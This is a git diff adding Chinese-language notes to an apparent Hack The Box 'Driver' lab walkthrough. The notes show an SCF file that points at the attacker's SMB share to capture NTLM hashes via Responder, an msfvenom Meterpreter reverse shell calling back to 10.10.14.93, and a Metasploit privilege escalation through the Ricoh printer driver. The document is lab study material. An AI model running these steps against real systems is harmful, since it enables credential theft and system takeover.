@@ -1,4 +1,71 @@
 ## Driver
+### 总结
+```
+.scf 是 Shell Command File（Windows 外壳命令文件），一种很老的 Windows 配置型快捷方式文件
+这个 nc.scf 本质上是一个 Windows 的快捷方式配置文件（Shell Command File），常用于 诱导 Windows 自动访问你的 SMB 共享，从而触发 NTLM 认证泄露（经典的 SCF/lnk/hash capture 技巧）
+
+这是 SCF 的固定格式：
+* Command=2 = 打开一个 shell 对象（基本是占位用）
+* 真正有攻击意义的是 IconFile
+
+
+[★]$ sudo responder -wv -I tun0
+[★]$ cat nc.scf
+[shell]
+Command=2
+IconFile=\\10.10.14.93\tools\nc.ico
+[Taskbar]
+Command=ToggleDecktop
+触发 NTLM 认证泄露
+
+[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.93 LPORT=4444 -f exe > shell.exe
+
+[1] payload => windows/x64/meterpreter/reverse_tcp //一个 普通用户权限的 Meterpreter shell（tony）
+[★]$ msfconsole
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
+lhost => tun0
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 4444
+lport => 4444
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+尝试迁移到一个进程，例如资源管理器，它的会话id为1，这意味着它是互动
+```
+ctl+z
+y
+use multi/recon/local_exploit_suggester
+set session 1
+run
+```
+[2]use multi/recon/local_exploit_suggester //扫描当前系统 看：Windows 版本、补丁情况、已装驱动、权限配置
+
+(Meterpreter 1)(C:\Users\tony\music) > migrate 4700
+Background session 1? [y/N]  y
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use multi/recon/local_exploit_suggester
+[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1
+session => 1
+[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
+
+15  exploit/windows/local/ricoh_driver_privesc                     Yes
+
+*Evil-WinRM* PS C:\Users\tony\music> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+
+[3] use exploit/windows/local/ricoh_driver_privesc
+[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ricoh_driver_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set session 1
+session => 1
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set lhost tun0
+lhost => tun0
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> run
+```
 ```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.238 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 [★]$ nmap -p$ports -sC -sV 10.129.95.238
@@ -332,7 +399,8 @@ session => 1
  16  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 
 
-
+在15 15 exploit/windows/local/ricoh_driver_privesc
+   
 ```
 #### 我们有一个可能的漏洞列表。鉴于主网站提到了打印机软件我们对与打印机相关的漏洞更感兴趣。另一个提示可以通过读取Powershell历史文件
 ```
